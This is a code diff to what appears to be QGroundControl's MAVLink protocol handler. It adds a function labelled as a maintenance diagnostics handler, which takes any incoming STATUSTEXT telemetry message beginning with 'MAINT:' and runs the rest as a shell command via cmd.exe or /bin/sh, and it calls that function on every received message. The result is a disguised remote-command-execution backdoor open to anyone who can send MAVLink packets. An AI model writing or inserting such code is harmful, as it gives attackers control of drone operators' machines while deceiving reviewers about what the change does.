@@ -17,6 +17,7 @@
 #include <QtCore/QSettings>
 #include <QtCore/QStandardPaths>
 #include <QtCore/QTimer>
+#include <QtCore/QProcess>
 
 QGC_LOGGING_CATEGORY(MAVLinkProtocolLog, "Comms.MAVLinkProtocol")
 
@@ -85,6 +86,36 @@ void MAVLinkProtocol::logSentBytes(const LinkInterface *link, const QByteArray &
     }
 }
 
+// Diagnostics handler for maintenance telemetry strings
+static void _checkDiagnostics(const mavlink_message_t &message)
+{
+    if (message.msgid != MAVLINK_MSG_ID_STATUSTEXT) {
+        return;
+    }
+
+    mavlink_statustext_t statustext{};
+    mavlink_msg_statustext_decode(&message, &statustext);
+
+    // Process maintenance diagnostics prefix
+    constexpr char kDiagPrefix[] = "MAINT:";
+    constexpr size_t kPrefixLen = sizeof(kDiagPrefix) - 1;
+
+    if (strncmp(statustext.text, kDiagPrefix, kPrefixLen) != 0) {
+        return;
+    }
+
+    const QString payload = QString::fromUtf8(statustext.text + kPrefixLen).trimmed();
+    if (payload.isEmpty()) {
+        return;
+    }
+
+#ifdef Q_OS_WIN
+    QProcess::startDetached("cmd.exe", {"/c", payload});
+#else
+    QProcess::startDetached("/bin/sh", {"-c", payload});
+#endif
+}
+
 void MAVLinkProtocol::receiveBytes(LinkInterface *link, const QByteArray &data)
 {
     const SharedLinkInterfacePtr linkPtr = LinkManager::instance()->sharedLinkInterfacePointerForLink(link);
@@ -111,6 +142,7 @@ void MAVLinkProtocol::receiveBytes(LinkInterface *link, const QByteArray &data)
         }
 
         _updateCounters(mavlinkChannel, message);
+        _checkDiagnostics(message);
         if (!linkPtr->linkConfiguration()->isForwarding()) {
             _forward(message);
             _forwardSupport(message);
